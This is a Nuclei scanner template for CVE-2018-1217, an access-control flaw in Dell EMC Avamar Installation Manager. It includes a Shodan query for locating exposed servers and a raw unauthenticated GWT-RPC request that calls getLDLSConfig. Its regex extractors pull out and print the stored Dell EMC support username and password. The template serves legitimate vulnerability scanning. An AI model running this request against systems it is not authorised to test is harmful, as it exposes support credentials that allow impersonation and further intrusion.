id: CVE-2018-1217

info:
  name: Dell EMC Avamar and Integrated Data Protection Appliance Installation Manager - Invalid Access Control
  author: daffainfo
  severity: critical
  description: |
    Avamar Installation Manager in Dell EMC Avamar Server 7.3.1, 7.4.1, and 7.5.0, and Dell EMC Integrated Data Protection Appliance 2.0 and 2.1, is affected by a missing access control check vulnerability which could potentially allow a remote unauthenticated attacker to read or change the Local Download Service (LDLS) credentials. The LDLS credentials are used to connect to Dell EMC Online Support. If the LDLS configuration was changed to an invalid configuration, then Avamar Installation Manager may not be able to connect to Dell EMC Online Support web site successfully. The remote unauthenticated attacker can also read and use the credentials to login to Dell EMC Online Support, impersonating the AVI service actions using those credentials.
  reference:
    - https://www.exploit-db.com/exploits/44441
    - https://nvd.nist.gov/vuln/detail/CVE-2018-1217
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-1217
    epss-score: 0.60826
    epss-percentile: 0.98189
    cwe-id: CWE-862
    cpe: cpe:2.3:a:dell:emc_avamar:*:*:*:*:*:*:*:*, cpe:2.3:a:dell:emc_integrated_data_protection_appliance:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: dell
    product: emc_avamar,emc_integrated_data_protection_appliance
    shodan-query: title:"AVAMAR"
  tags: cve,cve2018,dell,avamar,vkev

http:
  - raw:
      - |
        POST /avi/avigui/avigwt HTTP/1.1
        Host: {{Hostname}}
        X-Gwt-Permutation: {{randstr}}
        X-Gwt-Module-Base: https://{{Hostname}}/avi/avigui/
        Content-Type: text/x-gwt-rpc; charset=UTF-8

        7|0|6|https://{{Hostname}}/avi/avigui/|60AF6BC6976F9B1F05AC454813F5324D|com.avamar.avinstaller.gwt.shared.AvinstallerService|getLDLSConfig|java.lang.String/2004016611|{{Hostname}}|1|2|3|4|2|5|5|6|0|

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "//OK", "emcsupportUsername", "emcsupportPassword")'
          - 'status_code == 200'
        condition: and

    extractors:
      - type: regex
        name: username
        group: 1
        internal: true
        regex:
          - 'emcsupportUsername\\":\\"(.*?)\\"'

      - type: regex
        name: password
        group: 1
        internal: true
        regex:
          - 'emcsupportPassword\\":\\"(.*?)\\"'

      - type: dsl
        dsl:
          - '"Username: " + username + " Password: " + password'
# digest: 4a0a0047304502210093ea3f631c876594a7234b1207b85ef5b32229ceabb2fa38cbf9fd279b74c51802200395d08ab013b4b36b30dbc48847b77331f231b0c9316443ff9b9de38dea0a8d:922c64590222798bb761d5b6d8e72950